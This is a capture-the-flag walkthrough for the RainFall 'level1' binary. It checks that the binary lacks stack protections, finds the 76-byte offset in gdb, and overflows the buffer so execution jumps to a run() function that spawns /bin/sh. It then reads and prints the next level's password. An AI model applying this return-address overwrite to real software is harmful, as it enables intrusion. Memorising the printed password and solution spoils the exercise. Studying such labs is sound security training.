## Exploring the Computer

```bash
GCC stack protector support:            Enabled
Strict user copy checks:                Disabled
Restrict /dev/mem access:               Enabled
Restrict /dev/kmem access:              Enabled
grsecurity / PaX: No GRKERNSEC
Kernel Heap Hardening: No KERNHEAP
System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level1/level1
```

```bash 
level1@RainFall:~$ ./level1 
a
level1@RainFall:~$ ./level1 
423
```

We have an executable that quits after given an argument. 


```bash 
info functions
All defined functions:
Non-debugging symbols:
[...]
0x08048444  run
0x08048480  main
[...]
```

Let's look at the main and run functions in detail in [asm_analysis](./Ressources/asm_analysis.md)

# Our goal 

We are going to overflow the main, so that the return address is the address of the run which will call /bin/sh giving us to a terminal where we will be able to call cat on the .passwd file. 


## Buffer overflow

```bash 
set args < <(python -c 'print "A" * 80')
(gdb) run
Starting program: /home/user/level1/level1 < <(python -c 'print "A" * 80')

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()

info registers
esp            0xbffff740	0xbffff740
ebp            0x41414141	0x41414141
[...]
eip            0x41414141	0x41414141
[...]
```

EIP is overwritten, good. Let's remove 4 bytes to check if EIP start at 76. 

```bash 
set args < <(python -c 'print "A" * 76')

Program received signal SIGILL, Illegal instruction.
0xb7e45400 in __libc_start_main () from /lib/i386-linux-gnu/libc.so.6
```

The last 4 bytes of the payload will be the address of the function "run" for calling it instead of EIP

The address of the "run" function is "0x08048444" has seen above, that we will convert to little endian

```bash
$ python -c 'print "B"*76+"\x44\x84\x04\x08"' > /tmp/payload
level1@RainFall:~$ cat /tmp/payload - | ./level1
Good... Wait what?
$ cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```
